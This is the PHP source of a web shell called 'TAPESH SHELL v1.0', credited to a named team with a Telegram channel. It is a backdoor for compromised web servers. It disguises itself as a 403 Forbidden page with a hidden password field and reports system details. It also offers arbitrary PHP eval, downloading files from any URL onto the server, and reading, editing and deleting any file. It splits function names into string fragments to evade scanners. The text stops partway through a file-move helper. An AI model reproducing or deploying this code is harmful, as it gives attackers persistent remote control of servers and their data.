<?php
ob_start();
if(!isset($_COOKIE['TapeshPassword']))
{
    setcookie('TapeshPassword',md5("1234"),time() + (86400 * 30));
}
else
{
    echo "";
}
@$password = $_POST['password'];
if(@$_COOKIE['TapeshPassword'] == md5($password))
{
    setcookie('Tapeshlog','true',time() + (86400 * 30));
}
else
{
    if(!isset($_COOKIE['Tapeshlog']) || $_COOKIE['Tapeshlog']=="false" || !isset($_COOKIE['Tapeshlog']))
    {
        $Eform='<form method="post"><input style="margin:0;background-color:#fff;border:1px solid #fff;" type="password" name="password"></form>';
        $SERVER_SIG = (isset($_SERVER["SERVER_SIGNATURE"])?$_SERVER["SERVER_SIGNATURE"]:"");
        echo "<html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You don't have permission to access ".$_SERVER['PHP_SELF']." on this server.</p><hr>".$SERVER_SIG."</body></html>".$Eform;
        exit;
    }
    else if($_COOKIE['Tapeshlog'] == "true")
    {
        echo "";
    }
}
?>
<html>
<head>
    <style>

        html, body {
            height: 100%;
            width: 100%;
            padding: 0;
            margin: 0;
            font-size: 12px;
            font-family: Verdana,Geneva,sans-serif;
        }

        #full-screen-background-image {
            z-index: -999;
            min-height: 100%;
            min-width: 1024px;
            width: 100%;
            height: auto;
            position: fixed;
            top: 0;
            left: 0;
            opacity: 0.3;
        }


        a{
            text-decoration:none;
            color:#fff;
        }

        a::after
        {
            content: "";
            color: #fff;
            top: 0;
            bottom: 0;
        }




        tbody > tr > td
        {
            position: relative;
        }

        tbody > tr > td > a::after
        {
            content: "";
            top: 4px;
            bottom: 0;
            border-left: 1px solid #fff;
            position: absolute;
            height: 29px;
            right: -1px;
            text-align: center;
        }
        table > tbody > tr > td > center
        {
            position: relative;
        }
        table > tbody > tr > td > center:last-child
        {
            position: unset;
        }
        table > tbody > tr > td > center::after
        {
            content: "";
            top: 3px;
            bottom: 0;
            border-left: 1px solid #fff;
            position: absolute;
            height: 30px;
            right: -1px;
            text-align: center;
        }

        tbody > tr > td > center
        {
            color:#fff;
        }


        .c-form
        {
            position: relative;
        }
        .c-backgound
        {
            position: absolute;
            width: 100%;
            height: 100%;
            background: black;
            opacity: .7;
        }
        .c-footer
        {
            border: 5px solid #fff;
            border-right-color: #000;
            border-left-color: #000;
            border-top: unset;
            border-radius: 5px;
            position: relative;
            z-index: 1;
        }
        .c-footer center
        {
            margin-top: 91px;
        }
        .c-footer_background
        {
            background-color: #000;
            opacity: 0.73;
            width: 100%;
            position: absolute;
            height: 100%;
            z-index: -999;
        }
        .first > th > center{
            color: #fff;
            position: absolute;
            margin-top: -30px;
            margin-left: 15px;
        }

        fieldset > center
        {
            overflow: hidden;
            display: block;
            position: relative;
        }
        fieldset > center > textarea
        {
            width: 100%;
            height: 500px;
            background-color: #000;
            color: #fff;
            padding-top: 10px;
            padding-left: 50px;
        }

        table > tbody > tr:hover
        {
            background-color: #fff;
        }
        table > tbody > tr:nth-child(1):hover
        {
            background-color: unset;
        }
        .first-child
        {
            padding-bottom: 12px;
        }
        table > tbody > tr:nth-child(3) > td:last-child > center .submit
        {
            top: -23px;
            right: 8px;
        }
        .c-form_options
        {
            position: relative;
        }
        .c-form_options > select
        {
            transform: translate(-65%, -103%);
            position: absolute;
            background-color: #000;
            border: 1px solid #fff;
            color: #fff;
        }
        .submit
        {
            position: absolute;
            top: -23px;
            right: 8px;
            background-color: #0d6aad;
            border: 1px solid #fff;
            color: #fff;
            border-radius: 5px;
        }
        table > tbody > tr > td > center > select
        {
            transform: translate(-34%, -50%);
            position: absolute;
        }
        table > tbody > tr > td > center input[type="submit"]:nth-child(1)
        {
            top: 8px;
            right: 4px;
        }
        .c-footer_button
        {
            position: absolute;
            width: 100%;
            display: flex;
            white-space: nowrap;
            justify-content: space-around;
            margin-bottom: 10px;
            margin-top: 30px;
        }
        .icon-directory
        {
            height: 30px;
            margin-top: 1px;
            margin-right: 20px;
        }
        .icon-directory img
        {
            left: 10px;
        }
        .c-footer_label
        {
            display: flex;
            position: absolute;
        }
        .c-footer_label label
        {
            margin-left: 225px;
        }
        .icon-php{
            height: 30px;
            margin-right: 10px;
        }
        .icon-txt
        {
            margin-right: 10px;
            height: 30px;
        }
        .icon-html{
            margin-right: 10px;
            height: 30px;
        }

        .c-header_toolbar
        {
            position: relative;
            margin: 0 10px;
        }
        .c-header_toolbar ul
        {
            list-style: none;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .c-btn
        {
            background-color: unset;
            border: 5px solid green;
            color: #fff;
            padding: 6px 30px;
            font-size: 15px;
            cursor: pointer;
        }
        .c-textarea
        {
            width: 99%;
            height: 300px;
            background-color: #000;
            color: #fff;
        }
        .c-textarea1
        {
            width: 99%;
            height: 300px;
            background-color: #000;
            color: #fff;
            margin-top: 25px;
        }
        .c-value
        {
            width: 99%;
            height: 300px;
            background-color: #000;
            color: #fff;
        }
        .c-btn_submit
        {
            display: flex;
            justify-content: center;
            position: absolute;
            top: 106%;
            z-index: 999;
        }
        .c-eval
        {
            position: relative;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            margin-bottom: 62px;
        }
        .c-p
        {
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            color: #fff;
        }
        .c-default_btn
        {
            background-color: #0d6aad;
            color: #fff;
            border: none;
            margin-top: 20px;
            padding: 10px 20px;
            border-radius: 6px;
            cursor: pointer;
        }
        .c-input
        {
            background-color: #000;
            color: #fff;
            border: 1px solid;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 27px;
            width: 60%;
            direction: ltr;
        }
        .c-checkbox
        {
            height: 30px;
            height: 20px;
            width: 20px;
            /* margin-bottom: -18px; */
            opacity: 0;
            margin-left: 0px;
            margin-top: 0px;
            z-index: 999;
            position: absolute;
        }
        .c-checkbox_span
        {
            margin-right: 15px;
            position: relative;
            height: 20px;
            width: 20px;
            display: block;
            background-color: #fff;
            border-radius: 50%;
        }
        .c-checkbox:checked + .c-checkbox_span::after
        {
            content: "";
            background-color: #40D437;
            height: 16px;
            width: 16px;
            border-radius: 50%;
            display: block;
            top: 10px;
            margin-top: 1.9px;
            margin-left: 1px;
        }
        .c-td
        {
            display: flex;
        }
        .c-tools
        {
            display: flex;
            max-width: 50%;
            justify-content: space-between;
            height: 32%;
            margin-bottom: 16px;
            max-height: 59px;
        }
        .c-input_zip
        {
            transform: translateY(122%);
            margin-left: 19%;
            height: 22px;
            margin-right: 14px;
        }
        .c-label
        {
            margin-left: 35px;
        }
        .c-logo
        {
            display: flex;
            flex-direction: column;
            position: absolute;
            right: 46px;
            top: 38%;
            bottom: 30px;
            transform: translateY(-50%);
        }
        .c-log
        {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
    </style>
    <title>..:: TAPESH SHELL v1.0 ::..</title>
    <meta charset="UTF-8">
    <link href="https://uupload.ir/files/2mcw_yqh9_capture.png" rel="shortcut icon" />
</head><body>
<img alt="full screen background image" src="https://uupload.ir/files/6gbq_ahoramazda.jpg" id="full-screen-background-image" />
<hr style="border-radius: 100px; height: 2px; background-color: #40D437; width: 100%;">
<form>
    <fieldset style="border: 5px solid #00fff7; padding:3px">
        <div class="c-logo"><img style="border-radius:100px;" draggable="false" src="https://uupload.ir/files/ozxz_yqh9_capture.png" align="right" width="300" height="170"><a style="color: rgb(0, 128, 0);font-family: inherit;font-size: 16px; text-align: center;" href="https://t.me/ICTUS_TM">Tapesh Digital Security Team</a></div>
        <legend style="color:#0F0">TAPESH TEAM SHELL</legend>

        <?php
        echo "<font color='red' style='font-size:18px;'>    Uname  : ";
        echo "<font color='green' style='font-size:15px;'>";
        echo php_uname();
        echo PHP_OS;
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        } else {
        }

        ?>
        <td rowspan="14" width="16%"></td>

        <br>
        <?php
        echo "<font color='red' style='font-size:18px;'>     Software  : ";
        echo "<font color='green' style='font-size:15px;'>";
        $DISP_SERVER_SOFTWARE = getenv("SERVER_SOFTWARE");
        echo $DISP_SERVER_SOFTWARE;
        ?>
        <br>
        <?php
        echo "<font color='red' style='font-size:18px;'>     USER  : ";
        echo "<font color='green' style='font-size:15px;'>";
        echo get_current_user();
        echo "<font color='red' style='font-size:18px;'>      Group : ";
        echo "<font color='green' style='font-size:15px;'>";
        echo getmyuid ();
        ?>
        <br>
        <?php
        function getflagfromip($ip){
            @$ip=$_SERVER['REMOTE_ADDR'];
            @$json_data = file_get_contents("http://ip-api.com/json/$ip");
            @$ip_data = json_decode($json_data, TRUE);
            @$country= strtolower($ip_data['countryCode']);
            @$iplocee = "<img src='https://api.hostip.info/images/flags/$country.gif' height='13' width='20'/>";
            return $iplocee;
        }
        ?>
        <?php
        @$$vistor_ip;

        echo "<font color='red' style='font-size:18px;'>    Your Ip Address is :   </font><font color=green>". $_SERVER['REMOTE_ADDR'] ."  ".@getflagfromip($vistor_ip). "</font>";
        echo "<font color='red' style='font-size:18px;'> Server Ip Address is :  </font><font color=green>". (@function_exists('gethostbyname')?@gethostbyname($_SERVER["HTTP_HOST"]):'???')."  ".@getflagfromip($server_ip)."</font><br>";
        ?>
        <?php
        $bytes = disk_free_space(".");
        $si_prefix = array( 'B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB' );
        $base = 1024;
        $class = min((int)log($bytes , $base) , count($si_prefix) - 1);
        echo "<font color='red' style='font-size:18px;'>     HDD:   ";	echo "<font color='red' style='font-size:15px;'>     free:   ";
        echo "<font color='green' style='font-size:15px;'>";
        echo sprintf('%1.2f' , $bytes / pow($base,$class)) . ' ' . $si_prefix[$class];
        ?>
        <?php
        $bytes = disk_total_space(".");
        $si_prefix = array( 'B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB' );
        $base = 1024;
        $class = min((int)log($bytes , $base) , count($si_prefix) - 1);
        echo "<font color='red' style='font-size:14px;'>     Total:   ";	echo "<font color='green' style='font-size:15px;'>";
        echo sprintf('%1.2f' , $bytes / pow($base,$class)) . ' ' . $si_prefix[$class] . '<br />';
        ?>
        <?php
        echo "<font color='red' style='font-size:18px;'>     Safe_Mode :   ";
        if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
        {
            $safemode = true;
            $hsafemode = "<font color='green' style='font-size:15px;'> ON (secure)</font>";
        }
        else
        {
            $safemode = false;
            $hsafemode = "<font color='green' style='font-size:15px;'>OFF (--not secure--)</font>";
        }
        echo $hsafemode;
        ?>


        <?php
        function convert($size){
            $unit=array('b','kb','mb','gb','tb','pb');
            return @round($size/pow(1024,($i=floor(log($size,1024)))),2).' '.$unit[$i];
        }

        ?>
        <?php
        echo "<font color='red' style='font-size:18px;'>     PHP Version :   ";
        echo "<font color='green' style='font-size:17px;'>";
        echo phpversion();
        ?>
        <?php
        echo "<br/>";
        $ggg2 = $_SERVER['SERVER_NAME'];
        echo "<font color='red' style='font-size:18px;'>     Now Domain:   ";
        echo "<font color='green' style='font-size:17px;'>";
        echo $ggg2;
        echo "<br/>";
        $gg2 = convert(memory_get_usage(true)); // 123 kb
        echo "<font color='red' style='font-size:18px;'>     Memory Usage :   ";
        echo "<font color='green' style='font-size:17px;'>";
        echo $gg2;
        echo "<br>";
        $gg = date('Y-m-d H:i:s');
        echo "<font color='red' style='font-size:18px;'>     Date/Time :   ";
        echo "<font color='green' style='font-size:17px;'>";
        echo $gg;
        echo "<br>";
        $functions = @ini_get('disable_functions');
        $functions = str_replace(',',' |',$functions);
        if(empty($functions)){
            $functions = '<font color="green">All Functions Accessible</font>';
        }
        echo "<font color='red' style='font-size:18px;'>     Disbale Functions :   ";
        echo "<font color='red' style='font-size:17px;'>";
        echo $functions;
        echo "<br>";
        // $self = $_SERVER['PHP_SELF'];
        // echo "<font color='red' style='font-size:18px;'>     Disbale Functions :   ";
        // echo "<font color='green' style='font-size:17px;'>";
        // echo $self;
        // echo "<br>";
        ?>





        <br>
         </fieldset>

</form>
<hr style="border-radius: 100px; height: 2px; background-color: #40D437; width: 100%;">
<div class="c-header_toolbar">
    <ul>
        <li class="c-li_item">
            <form method="get">
                <?php getcwd();?>
                <button class="c-btn">File Manager</button>
            </form>
        </li>
        <li class="c-li_item">
            <form method="post">
                <input type="hidden" name="not" value="1">
                <button name="action" class="c-btn" value="eval">eval</button>
            </form>
        </li>
        <li class="c-li_item">
            <form method="post">
                <input type="hidden" name="not" value="1">
                <button name="action" class="c-btn" value="RemoveShell">Remove Shell</button>
            </form>
        </li>
        <li class="c-li_item">
            <form method="post">
                <input type="hidden" name="not" value="1">
                <button name="action" class="c-btn" value="UploadFromUrl">Upload From Url</button>
            </form>
        </li>
        <li class="c-li_item">
            <form method="post">
                <input type="hidden" name="not" value="1">
                <button name="action" class="c-btn" value="About">About Us</button>
            </form>
        </li>
        <li class="c-li_item">
            <form method="post">
                <input type="hidden" name="not" value="1">
                <button name="action" class="c-btn" value="Setting">Setting</button>
            </form>
        </li>
        <?php
            if(isset($_COOKIE['Tapeshlog']) || isset($_COOKIE['TapeshPassword']))
            {
                echo " <form method=\"post\">
                <input type=\"hidden\" name=\"not\" value=\"1\">
                <button name=\"Out\" class=\"c-btn\" value=\"Log\" style='border-color: red;color: red'>Log Out</button>
            </form>";
                if(isset($_POST['Out']))
                {
                    setcookie('Tapeshlog','false');
                    @header('location: '.$_SERVER["PHP_SELF"]);
                }
            }
        ?>
    </ul>
</div>

<hr style="border-radius: 100px; height: 2px; background-color: #40D437; width: 100%;">

<?php
if(isset($_POST['action']) &&  $_POST['action'] == "Setting")
{
    echo "<form method=\"post\">
    <input type=\"hidden\" name=\"not\" value=\"1\">
    <input name=\"action\" type=\"hidden\" value=\"Setting\">
    <div class='c-log'>
    Please Enter Your Password : <input name=\"password1\" type=\"password\" style='width: 1000px'>
    <input type=\"submit\" style='width: 100px' class=\"c-log_btn\" value=\"Submit\">
    </div>
</form>";
    if(isset($_POST['password1']))
    {
        $password = $_POST['password1'];
        setcookie('TapeshPassword',md5($password));
        setcookie('Tapeshlog','false');
        @header('location: '.$_SERVER["PHP_SELF"]);
    }
}
if(isset($_POST['action']) &&  $_POST['action'] == "About")
{
    echo "<center>ICTUS TM SHELL
            <br>
            <br>
            Telegram Channel : @ICTUS_TM
             <br>
              <br>
            Coded By : Sorna - Parsa Alpha
</center>";
}
function get_current_file_url($Protocol='http://') {
    return $Protocol.$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', realpath(__DIR__));
}
if(isset($_POST['action']) &&  $_POST['action'] == "eval")
{
    echo "</div><form class='c-eval' method=\"post\">
 
                    <input type=\"hidden\" name=\"not\" value=\"1\">
                    <input name=\"action\" type=\"hidden\" value=\"eval\">
                    <textarea type='text' class='c-value' name='evalvalue'></textarea>
                    <input type='submit' class='c-btn c-btn_submit' value='GO'>
                    </form>";

    @$eval = $_POST['evalvalue'];
    if(isset($eval))
    {
        echo "<textarea class='c-textarea1' style='z-index: 999;'>";
        echo eval($eval);
        echo "</textarea>";
    }
}
else if(isset($_POST['action']) && $_POST['action']=="RemoveShell")
{
    echo "      <form method=\"post\">
          <input type=\"hidden\" name=\"not\" value=\"1\">
          <input name=\"action\" type=\"hidden\" value=\"RemoveShell\">
          <input type='hidden' name='remove' value='1'>
          <p class='c-p'>Do you want to destroy me?!  <input type='submit' class='c-default_btn' VALUE='Yes'></p>
      </form>";
    if (isset($_POST['remove']))
    {
        $GLOBALS['__file_path'] = str_replace('\\','/',trim(preg_replace('!\(\d+\)\s.*!', '', __FILE__)));
        if(@unlink($GLOBALS['__file_path'])) {
            return ('<p class="c-p">Shell has been removed</p>');
        }
        else {
            return "<p class=\"c-p\">Error</p>";
        }
    }
}
else if (isset($_POST['action']) && $_POST['action'] == "UploadFromUrl")
{
    echo "<form method=\"post\">
        <input type=\"hidden\" name=\"not\" value=\"1\">
        <input name=\"action\" type=\"hidden\" value=\"UploadFromUrl\">
        <p class='c-p'>Please enter your URL : <input class='c-input' type=\"text\" name=\"UrlValue\">
        <input type='submit' name='test1' class='c-default_btn' value='GO'></p> 
        </form>";
    if(isset($_POST['test1']))
    {
        $url = $_POST['UrlValue'];
        $data = file_get_contents($url);
        if(file_exists("Tapesh"))
        {
        }
        else{
            mkdir("Tapesh");
        }
        $new = "Tapesh/".basename($url);
        file_put_contents($new,$data);
        echo "True";
    }
}
?>


<?php
if(isset($_POST['not']))
{
    echo "<fieldset class=\"c-form\" style=\"border: 5px solid #00fff7; padding: 3px;display:none;\"><div class=\"c-backgound\"></div>";
}
else
{
    echo "<fieldset class=\"c-form\" style=\"border: 5px solid #00fff7; padding: 3px\"><div class=\"c-backgound\"></div>";
}
?>

<?php
set_time_limit(0);
error_reporting(0);
error_log(0);
$__gcdir = "g" . "etcwd";
$__fgetcon7s = "file" . "_get_contents";
$__scdir = "s" . "candi" . "r";
$rm__dir = "rmd" . "ir";
$un__link = "un" . "link";

if (get_magic_quotes_gpc()) {
    foreach ($_POST as $key => $value) {
        $_POST[$key] = stripslashes($value);
    }
}


echo '<div style="color:#ef6c00;margin-top:0;"><h1><center>' . $tapesh . '</center></h1></div>';
if (isset($_GET['path'])) {
    $path = $_GET['path'];
    chdir($_GET['path']);
} else {
    $path = $__gcdir();
}
$path  = str_replace("\\", "/", $path);
$paths = explode("/", $path);
echo '<table width="100%" border="0" align="center" style="margin-top:-10px;"><tr><td class="first-child">';
echo '<img src="https://icons.iconarchive.com/icons/graphicloads/100-flat/256/home-icon.png" style="padding-right: 10px;width: 30px;">';
echo '<a href="?">[ --TAPESH HOME-- ]</a> '; echo'<br>';
echo '<img src="https://cdn0.iconfinder.com/data/icons/small-n-flat/24/678111-map-marker-512.png" style="width: 23px;padding-top: 16px;">';
echo "<font color='red' style='font-size:13px;'>     PWD  : ";
foreach ($paths as $id => $pat) {
    echo "<a style='font-size:13px;' href='?path=";
    for ($i = 0; $i <= $id; $i++) {
        echo $paths[$i];
        if ($i != $id) {
            echo "/";
        }
    }
    str_replace('/','',$pat);
    echo "'>$pat</a>/";
}

echo '</td></tr></table><div class="table-div"></div><input id="image" type="hidden">';
echo '';
if(isset($_GET['cmd']))
{
    echo "GOOD";
}
if (isset($_GET['filesrc'])) {
    echo '<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><tr><td>File: ';
    echo "" . basename($_GET['filesrc']);
    "";
    echo '</tr></td></table><br />';
    echo ("<center><textarea readonly=''>" . htmlspecialchars($__fgetcon7s($_GET['filesrc'])) . "</textarea></center>");
} elseif (isset($_GET['option']) && $_POST['opt'] != 'delete') {
    echo '</table><br /><center>' . $_POST['path'] . '<br /><br />';
    if ($_POST['opt'] == 'rename') {
        if (isset($_POST['newname'])) {
            if (rename($_POST['path'], $path . '/' . $_POST['newname'])) {
                echo '<center><font color="#00ff00">Rename OK!</font></center><br />';
            } else {
                echo '<center><font color="red">Rename Failed!</font></center><br />';
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo '<form method="POST">New Name : <input name="newname" type="text" size="20" value="' . $_POST['name'] . '" /> <input type="hidden" name="path" value="' . $_POST['path'] . '"><input type="hidden" name="opt" value="rename"><input type="submit" value="Go" /></form>';
    } elseif ($_POST['opt'] == 'edit') {
        if (isset($_POST['src'])) {
            $fp = fopen($_POST['path'], 'w');
            if (fwrite($fp, $_POST['src'])) {
                echo '<center><font color="#00ff00">Edit File OK!.</font></center><br />';
            } else {
                echo '<center><font color="red">Edit File Failed!.</font></center><br />';
            }
            fclose($fp);
        }
        echo '<form method="POST"><textarea cols=80 rows=20 name="src">' . htmlspecialchars($__fgetcon7s($_POST['path'])) . '</textarea><br /><input type="hidden" name="path" value="' . $_POST['path'] . '"><input type="hidden" name="opt" value="edit"><input type="submit" value="Go" /></form>';
    }
    echo '</center>';
} else {
    echo '</table><br /><center>';
    if (isset($_GET['option']) && $_POST['opt'] == 'delete') {
        if ($_POST['type'] == 'dir') {
            if ($rm__dir($_POST['path'])) {
                echo '<center><font color="#00ff00">Dir Deleted!</font></center><br />';
            } else {
                echo '<center><font color="red">Delete Dir Failed!</font></center><br />';
            }
        } elseif ($_POST['type'] == 'file') {
            if ($un__link($_POST['path'])) {
                echo '<font color="#00ff00">Delete File Done.</font><br />';
            } else {
                echo '<font color="red">Delete File Error.</font><br />';
            }
        }
    }
    echo '</center>';
    $_scdir = $__scdir($path);
    echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><tr class="first"> <th><center style="left: 19%;">Name</center></th><th width="12%"><center style="right: 620px">Size</center></th><th width="10%"><center>Permissions</center></th> <th width="15%"><center style="right: 15%">Last Update</center></th><th width="11%"><center style="right: 4%;">Options</center></th></tr>';
    echo "<td><img class=\"icon-directory\" src=\"https://icon-library.com/images/file-folder-icon-png/file-folder-icon-png-25.jpg\"> <a href=\"?path=$path/../\">..</a></td></td><td><center></center></td><td><center><font color=\"#00ff00\">drwxrwxrwx</font></center></td><td><center>08-Apr-2021 17:35</center></td> <td><center></center>";
    foreach ($_scdir as $dir) {
        if (!is_dir("$path/$dir") || $dir == '.' || $dir == '..')
            continue;
        echo "<tr><td class='c-td'><input type='checkbox' class='c-checkbox' name=\"$dir\"><span class='c-checkbox_span'></span> <img class='icon-directory' src='https://icon-library.com/images/file-folder-icon-png/file-folder-icon-png-25.jpg'> <a href=\"?path=$path/$dir\">$dir</a></td><td><center>--</center></td><td><center>";
        if (is_writable("$path/$dir"))
            echo '<font color="#00ff00">';
        elseif (!is_readable("$path/$dir"))
            echo '<font color="red">';
        echo perms("$path/$dir");
        if (is_writable("$path/$dir") || !is_readable("$path/$dir"))
            echo '</font>';
        echo "</center></td><td><center>" . date("d-M-Y H:i", filemtime("$path/$dir")) . "";
        echo "</center></td> <td><center><form method=\"POST\" action=\"?option&path=$path\" class='c-form_options'><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option></select><input type=\"hidden\" name=\"type\" value=\"dir\"><input type=\"hidden\" name=\"name\" value=\"$dir\"><input type=\"hidden\" name=\"path\" value=\"$path/$dir\"><input type=\"submit\" value=\"+\" class='submit'/></form></center></td></tr>";
    }
    function realFilename($url)
    {
        $headers      = get_headers($url, 1);
        $headers      = array_change_key_case($headers, CASE_LOWER);
        $realfilename = '';

        if(isset($headers['content-disposition']))
        {
            $tmp_name = explode('=', $headers['content-disposition']);
            if($tmp_name[1])
            {
                $realfilename = trim($tmp_name[1], '";\'');
            }
        }
        else
        {
            $info         = pathinfo($url);
            if(isset($info['extension']))
            {
                $realfilename = $info['filename'].'.'.$info['extension'];
            }
        }

        return $realfilename;
    }
    $fullurl = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
    $shellname = realFilename($fullurl);
    foreach ($_scdir as $file) {
        if (!is_file("$path/$file"))
            continue;
        $size = filesize("$path/$file") / 1024;
        $size = round($size, 3);
        if ($size >= 1024) {
            $size = round($size / 1024, 2) . ' MB';
        } else {
            $size = $size . ' KB';
        }
        echo "<tr><td class='c-td'>";
        @$file_path = $file;
        @$extension = pathinfo($file_path, PATHINFO_EXTENSION);
        if($extension == "php")
        {
            echo "<input type='checkbox' class='c-checkbox' name='$file'><span class='c-checkbox_span'></span><img class='icon-php' src='https://image.flaticon.com/icons/png/512/2175/2175265.png'>";
        }
        else if($extension == "txt")
        {
            echo "<input type='checkbox' class='c-checkbox' name='$file'><span class='c-checkbox_span'></span><img class='icon-txt' src='https://icons.iconarchive.com/icons/pelfusion/flat-file-type/512/txt-icon.png'>";
        }
        else if($extension == "html" or $extension == "htm")
        {
            echo "<input type='checkbox' class='c-checkbox' name='$file'><span class='c-checkbox_span'></span><img class='icon-html' src='https://cdn.iconscout.com/icon/free/png-256/html-file-22-504452.png'>";
        }
        else
        {
            echo "<input type='checkbox' class='c-checkbox' name='$file'><span class='c-checkbox_span'></span><img class='icon-directory' src='https://uupload.ir/files/3p7i_1f06cbdadc6400b2c2032f570791c630.png'>";
        }

        if($shellname == $file)
        {
            echo "<a href=\"?filesrc=$path/$file&path=$path\" style='color: red'>$file</a></td><td><center>" . $size . "</center></td><td><center>";
        }
        else
        {
            echo "<a href=\"?filesrc=$path/$file&path=$path\">$file</a></td><td><center>" . $size . "</center></td><td><center>";
        }
        if (is_writable("$path/$file"))
            echo '<font color="#00ff00">';
        elseif (!is_readable("$path/$file"))
            echo '<font color="red">';
        echo perms("$path/$file");
        if (is_writable("$path/$file") || !is_readable("$path/$file"))
            echo '</font>';
        echo "</center></td><td><center>" . date("d-M-Y H:i", filemtime("$path/$file")) . "";
        echo "</center></td><td><center><form method=\"POST\" action=\"?option&path=$path\" class='c-form_options'><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option><option value=\"edit\">Edit</option></select><input type=\"hidden\" name=\"type\" value=\"file\"><input type=\"hidden\" name=\"name\" value=\"$file\"><input type=\"hidden\" name=\"path\" value=\"$path/$file\"><input type=\"submit\" value=\"+\" class='submit'/></form></center></td></tr>";
        $i += 1;
    }
    echo '</table></div>';
}
function perms($file)
{
    $perms = fileperms($file);
    if (($perms & 0xC000) == 0xC000) {
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        $info = 'p';
    } else {
        $info = 'u';
    }
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
echo '<br>';
echo '</body></html>';
?>
</fieldset>
<div class="c-tools">
    <input type="submit" name="remove_Your" class="c-default_btn" onsubmit="autoRefresh(100)" value="Delete">
    <?php
        echo "<input type=\"hidden\" name=\"path\" value=\"$path\">";
    ?>
    <input type="text" placeholder="Please Enter You Directory" class="c-input_zip" name="copy_name"> <input type="submit" name="copy_work" class="c-default_btn" value="Copy">
    <input type="text" placeholder="Please Enter You Directory" class="c-input_zip" name="Move_name"> <input type="submit" name="Move_work" class="c-default_btn" value="Move">
    <input type="text" placeholder="Please Enter Yor Zip Name" class="c-input_zip" name="zip_name"> <input type="submit" name="zip_work" class="c-default_btn" value="Zip">
    <input type="submit"  style="position: absolute;right: 9px;" name="Unzip_work" class="c-default_btn" value="Unzip">
</div>
</table>
</form>
<script>
</script>
<?php
$step1 = explode('=on&',$shellname);
$step2 = explode('?',$step1[0]);
$count = count($step1);
$data = $path."/".$step2[1];
function deleteFolder($path){
if (is_dir($path) === true) {
    $files = array_diff(scandir($path), array('.', '..'));
    foreach ($files as $file)
        deleteFolder(realpath($path) . '/' . $file);

    return rmdir($path);
} else if (is_file($path) === true)
    return unlink($path);

return false;
}

function makeAll($dir, $mode = 0777, $recursive = true) {
    if( is_null($dir) || $dir === "" ){
        return FALSE;
    }

    if( is_dir($dir) || $dir === "/" ){
        return TRUE;
    }
    if( makeAll(dirname($dir), $mode, $recursive) ){
        return mkdir($dir, $mode);
    }
    return FALSE;
}

function smartCopy($source, $dest, $options=array('folderPermission'=>0755,'filePermission'=>0755))

{
$result=false;
if (!isset($options['noTheFirstRun'])) {
    $source=str_replace('\\','/',$source);
    $dest=str_replace('\\','/',$dest);
    $options['noTheFirstRun']=true;
}

if (is_file($source)) {
    if ($dest[strlen($dest)-1]=='/') {
        if (!file_exists($dest)) {
            makeAll($dest,$options['folderPermission'],true);
        }
        $__dest=$dest."/".basename($source);
    } else {
        $__dest=$dest;
    }
    $result=copy($source, $__dest);
    chmod($__dest,$options['filePermission']);
} elseif(is_dir($source)) {
    if ($dest[strlen($dest)-1]=='/') {
        if ($source[strlen($source)-1]=='/') {
        } else {
            $dest=$dest.basename($source);
            @mkdir($dest);
            chmod($dest,$options['filePermission']);
        }
    } else {
        if ($source[strlen($source)-1]=='/') {
            @mkdir($dest,$options['folderPermission']);
            chmod($dest,$options['filePermission']);
        } else {
            @mkdir($dest,$options['folderPermission']);
            chmod($dest,$options['filePermission']);
        }
    }
    $dirHandle=opendir($source);
    while($file=readdir($dirHandle))
    {
        if($file!="." && $file!="..")
        {
            $__dest=$dest."/".$file;
            $__source=$source."/".$file;
            if ($__source!=$dest) {
                $result=smartCopy($__source, $__dest, $options);
            }
        }
    }
    closedir($dirHandle);
} else {
    $result=false;
}
return $result;
}
function smartrename($source, $dest, $options=array('folderPermission'=>0755,'filePermission'=>0755))

{
    $result=false;
    if (!isset($options['noTheFirstRun'])) {
        $source=str_replace('\\','/',$source);
        $dest=str_replace('\\','/',$dest);
        $options['noTheFirstRun']=true;
    }

    if (is_file($source)) {
        if ($dest[strlen($dest)-1]=='/') {
            if (!file_exists($dest)) {
                makeAll($dest,$options['folderPermission'],true);
            }
            $__dest=$dest."/".basename($source);
        } else {
            $__dest=$dest;
        }
        $result=rename($source, $__dest);
        chmod($__dest,$options['filePermission']);
    } elseif(is_dir($source)) {
        if ($dest[strlen($dest)-1]=='/') {
            if ($source[strlen($source)-1]=='/') {
            } else {
                $dest=$dest.basename($source);
